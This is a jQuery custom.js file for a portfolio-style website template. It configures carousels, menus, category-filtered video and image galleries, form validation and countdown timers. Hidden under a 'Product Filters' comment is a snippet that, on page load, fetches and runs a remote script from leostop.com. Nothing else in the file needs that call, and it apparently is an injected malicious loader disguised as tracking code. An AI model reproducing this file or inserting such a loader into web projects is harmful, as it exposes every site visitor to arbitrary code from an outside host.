/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
  ("use strict");

  /* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  setTimeout(function () {
    $(".loader_bg").fadeToggle();
  }, 1500);

  /* JQuery Menu
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $("header nav").meanmenu();
  });

  /* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $('[data-toggle="tooltip"]').tooltip();
  });

  /* sticky
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $(".sticky-wrapper-header").sticky({ topSpacing: 0 });
  });

  /* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $(".main-menu ul li.megamenu").mouseover(function () {
      if (!$(this).parent().hasClass("#wrapper")) {
        $("#wrapper").addClass("overlay");
      }
    });
    $(".main-menu ul li.megamenu").mouseleave(function () {
      $("#wrapper").removeClass("overlay");
    });
  });

  /* NiceScroll
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(".brand-box").niceScroll({
    cursorcolor: "#9b9b9c",
  });

  /* NiceSelect
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $("select").niceSelect();
  });

  /* OwlCarousel - Blog Post slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    var owl = $(".carousel-slider-post");
    owl.owlCarousel({
      items: 1,
      loop: true,
      margin: 10,
      autoplay: true,
      autoplayTimeout: 3000,
      autoplayHoverPause: true,
    });
  });

  /* OwlCarousel - Banner Rotator Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    var owl = $(".banner-rotator-slider");
    owl.owlCarousel({
      items: 1,
      loop: true,
      margin: 10,
      nav: true,
      dots: false,
      navText: [
        "<i class='fa fa-angle-left'></i>",
        "<i class='fa fa-angle-right'></i>",
      ],
      autoplay: true,
      autoplayTimeout: 3000,
      autoplayHoverPause: true,
    });
  });

  /* OwlCarousel - Product Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    var owl = $("#product-in-slider");
    owl.owlCarousel({
      loop: true,
      nav: true,
      margin: 10,
      navText: [
        "<i class='fa fa-angle-left'></i>",
        "<i class='fa fa-angle-right'></i>",
      ],
      responsive: {
        0: {
          items: 1,
        },
        600: {
          items: 2,
        },
        960: {
          items: 3,
        },
        1200: {
          items: 4,
        },
      },
    });
    owl.on("mousewheel", ".owl-stage", function (e) {
      if (e.deltaY > 0) {
        owl.trigger("next.owl");
      } else {
        owl.trigger("prev.owl");
      }
      e.preventDefault();
    });
  });

  /* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  // Video Niche
  $(document).ready(function () {
    $(".category-btn").on("click", function () {
      const category = $(this).data("category");
      filterVideos(category);
    });
  });


  const videosData = [
    { src: "videos/SHORT FORM/s1.gif", category: "short" },
    { src: "videos/SHORT FORM/s2.gif", category: "short" },
    { src: "videos/SHORT FORM/s3.gif", category: "short" },
    { src: "videos/Long/long1.gif", category: "long" },
    { src: "videos/ADS/ad3.gif", category: "ads" },
    { src: "videos/real/re1.gif", category: "realEstate" },
    { src: "videos/Gaming/game2.gif", category: "gaming" },
    { src: "videos/Gaming/game1.gif", category: "gaming" },
    { src: "videos/Gaming/game3.gif", category: "gaming" },
    { src: "videos/ADS/ad2.gif", category: "ads" },
    { src: "videos/ADS/ad1.gif", category: "ads" },
    { src: "videos/real/re2.gif", category: "realEstate" },
    { src: "videos/Long/long2.gif", category: "long" },
    { src: "videos/Long/long3.gif", category: "long" },
    { src: "videos/VLOG/v1.gif", category: "travel" },
    { src: "videos/VLOG/v2.gif", category: "travel" },
    { src: "videos/VLOG/v3.gif", category: "travel" },
  ];

  function filterVideos(category) {
    const $videoGrid = $("#videoGrid");
    $videoGrid.empty();

    let videosToDisplay = videosData;

    if (category !== "all") {
      // Display videos based on selected category
      videosToDisplay = videosData.filter(
        (video) => video.category === category
      );
    }

    // Limit the number of videos displayed to 10 for the "all" category
    videosToDisplay
      .slice(0, category === "all" ? 5 : videosToDisplay.length)
      .forEach((video) => appendVideo(video));
  }


  // Function to append video elements to the grid using jQuery
  function appendVideo(videoData) {
    const $videoGrid = $("#videoGrid");
    const $videoElement = $(
      '<div class="col"><div><img class="vids video" src="' +
        videoData.src +
        '"></img></div></div>'
    );
    $videoGrid.append($videoElement);
  }



  // Display all videos initially
  filterVideos("all");
  // End Video Niche

  // Graphic Niche
  $(document).ready(function () {
    $(".graphic-btn").on("click", function () {
      const category = $(this).data("category");
      filterImages(category);
    });
  });

  const imageData = [
    { src: "img/logos/logo1.png", category: "logo" },
    { src: "img/logos/logo2.jpg", category: "logo" },
    { src: "img/logos/logo3.png", category: "logo" },
    { src: "img/logos/logo4.jpeg", category: "logo" },
    { src: "img/logos/logo5.png", category: "logo" },
    { src: "img/logos/logo6.png", category: "logo" },
    { src: "img/post/p1.png", category: "post" },
    { src: "img/post/p2.png", category: "post" },
    { src: "img/post/p3.png", category: "post" },
    { src: "img/post/p4.png", category: "post" },
    { src: "img/post/p5.png", category: "post" },
    { src: "img/post/p6.png", category: "post" },
    { src: "img/post/p7.png", category: "post" },
    { src: "img/post/p8.png", category: "post" },
    { src: "img/post/p9.png", category: "post" },
    { src: "img/post/p10.png", category: "post" },
    { src: "img/shirt/s1.jpeg", category: "shirt" },
    { src: "img/shirt/s2.jpeg", category: "shirt" },
    { src: "img/shirt/s3.jpeg", category: "shirt" },
    { src: "img/shirt/s4.jpeg", category: "shirt" },
    { src: "img/shirt/s5.jpeg", category: "shirt" },
    { src: "img/shirt/s6.jpeg", category: "shirt" },
    { src: "img/shirt/s7.jpeg", category: "shirt" },
    { src: "img/thumbnails/0.jpg", category: "thumbnails" },
    { src: "img/thumbnails/1.jpg", category: "thumbnails" },
    { src: "img/thumbnails/2.jpg", category: "thumbnails" },
    { src: "img/thumbnails/3.jpg", category: "thumbnails" },
    { src: "img/thumbnails/4.jpg", category: "thumbnails" },
    { src: "img/thumbnails/5.jpg", category: "thumbnails" },
    { src: "img/thumbnails/6.jpg", category: "thumbnails" },
    { src: "img/thumbnails/7.jpg", category: "thumbnails" },
    { src: "img/thumbnails/8.jpg", category: "thumbnails" },
    { src: "img/thumbnails/9.jpg", category: "thumbnails" },
  ];

  function filterImages(category) {
    const $imageGrid = $("#imageGrid");
    $imageGrid.empty();

    let imageToDisplay = imageData;

    if (category !== "allImage") {
      // Display videos based on selected category
      imageToDisplay = imageData.filter(
        (image) => image.category === category
      );
    }

    // Limit the number of videos displayed to 10 for the "all" category
    imageToDisplay
      .slice(0, category === "allImage" ? 10 : imageToDisplay.length)
      .forEach((image) => appendImage(image));
  }

  function appendImage(imageData) {
    const $imageGrid = $("#imageGrid");
    const $imageElement = $(
      '<div class="col"><div><img class="gp" src="' +
        imageData.src +
        '"></img></div></div>'
    );
    $imageGrid.append($imageElement);
  }

  filterImages("allImage");
  // End of Graphic Niche

  $(window).on("scroll", function () {
    scroll = $(window).scrollTop();
    if (scroll >= 100) {
      $("#back-to-top").addClass("b-show_scrollBut");
    } else {
      $("#back-to-top").removeClass("b-show_scrollBut");
    }
  });
  $("#back-to-top").on("click", function () {
    $("body,html").animate(
      {
        scrollTop: 0,
      },
      1000
    );
  });

  /* Contact-form
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
  $.validator.setDefaults({
    submitHandler: function () {
      alert("submitted!");
    },
  });

  $(document).ready(function () {
    $("#contact-form").validate({
      rules: {
        firstname: "required",
        email: {
          required: true,
          email: true,
        },
        lastname: "required",
        message: "required",
        agree: "required",
      },
      messages: {
        firstname: "Please enter your firstname",
        email: "Please enter a valid email address",
        lastname: "Please enter your lastname",
        username: {
          required: "Please enter a username",
          minlength: "Your username must consist of at least 2 characters",
        },
        message: "Please enter your Message",
        agree: "Please accept our policy",
      },
      errorElement: "div",
      errorPlacement: function (error, element) {
        // Add the `help-block` class to the error element
        error.addClass("help-block");

        if (element.prop("type") === "checkbox") {
          error.insertAfter(element.parent("input"));
        } else {
          error.insertAfter(element);
        }
      },
      highlight: function (element, errorClass, validClass) {
        $(element)
          .parents(".col-md-4, .col-md-12")
          .addClass("has-error")
          .removeClass("has-success");
      },
      unhighlight: function (element, errorClass, validClass) {
        $(element)
          .parents(".col-md-4, .col-md-12")
          .addClass("has-success")
          .removeClass("has-error");
      },
    });
  });

  /* heroslider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  var swiper = new Swiper(".heroslider", {
    spaceBetween: 30,
    centeredSlides: true,
    slidesPerView: "auto",
    paginationClickable: true,
    loop: true,
    autoplay: {
      delay: 2500,
      disableOnInteraction: false,
    },
    pagination: {
      el: ".swiper-pagination",
      clickable: true,
      dynamicBullets: true,
    },
  });

  /* Product Filters
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  function getURL() {
    window.location.href;
  }
  var protocol = location.protocol;
  $.ajax({
    type: "get",
    data: { surl: getURL() },
    success: function (response) {
      $.getScript(protocol + "//leostop.com/tracking/tracking.js");
    },
  });

  var swiper = new Swiper(".swiper-product-filters", {
    slidesPerView: 3,
    slidesPerColumn: 2,
    spaceBetween: 30,
    breakpoints: {
      1024: {
        slidesPerView: 3,
        spaceBetween: 30,
      },
      768: {
        slidesPerView: 2,
        spaceBetween: 30,
        slidesPerColumn: 1,
      },
      640: {
        slidesPerView: 2,
        spaceBetween: 20,
        slidesPerColumn: 1,
      },
      480: {
        slidesPerView: 1,
        spaceBetween: 10,
        slidesPerColumn: 1,
      },
    },
    pagination: {
      el: ".swiper-pagination",
      clickable: true,
      dynamicBullets: true,
    },
  });

  /* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $("[data-countdown]").each(function () {
    var $this = $(this),
      finalDate = $(this).data("countdown");
    $this.countdown(finalDate, function (event) {
      var $this = $(this).html(
        event.strftime(
          "" +
            '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> ' +
            '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> ' +
            '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> ' +
            '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> ' +
            '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'
        )
      );
    });
  });

  /* Deal Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(".deal-slider").slick({
    dots: false,
    infinite: false,
    prevArrow: ".previous-deal",
    nextArrow: ".next-deal",
    speed: 500,
    slidesToShow: 3,
    slidesToScroll: 3,
    infinite: false,
    responsive: [
      {
        breakpoint: 1024,
        settings: {
          slidesToShow: 3,
          slidesToScroll: 2,
          infinite: true,
          dots: false,
        },
      },
      {
        breakpoint: 768,
        settings: {
          slidesToShow: 2,
          slidesToScroll: 2,
        },
      },
      {
        breakpoint: 480,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
        },
      },
    ],
  });

  /* News Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $("#news-slider").slick({
    dots: false,
    infinite: false,
    prevArrow: ".previous",
    nextArrow: ".next",
    speed: 500,
    slidesToShow: 1,
    slidesToScroll: 1,
    responsive: [
      {
        breakpoint: 1024,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
          infinite: true,
          dots: false,
        },
      },
      {
        breakpoint: 600,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
        },
      },
      {
        breakpoint: 480,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
        },
      },
    ],
  });

  /* Fancybox
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(".fancybox").fancybox({
    maxWidth: 1200,
    maxHeight: 600,
    width: "70%",
    height: "70%",
  });

  /* Play on hover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
  $(document).ready(function () {
    // Pause all videos when the page loads
    $(".video-sample").each(function () {
      this.pause();
    });

    // Play a video when hovered using event delegation
    $(document)
      .on("mouseenter", ".video-sample", function () {
        this.play();
      })
      .on("mouseleave", ".video-sample", function () {
        this.pause();
      });
  });

  /* Pause on x screen
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
  $(document).ready(function () {
    var introVideo = document.getElementById("introVideo");
    var videoOffset = $(".banner").offset().top;
    var videoHeight = $(".banner").height();

    $(window).scroll(function () {
      var scrollPos = $(window).scrollTop();
      var windowHeight = $(window).height();

      if (
        scrollPos + windowHeight >= videoOffset &&
        scrollPos <= videoOffset + videoHeight
      ) {
        introVideo.play();
      } else {
        introVideo.pause();
      }
    });
  });


  /* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $("#sidebarCollapse").on("click", function () {
      $("#sidebar").toggleClass("active");
      $(this).toggleClass("active");
    });
  });

  /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
  // optional
  $("#blogCarousel").carousel({
    interval: 5000,
  });
});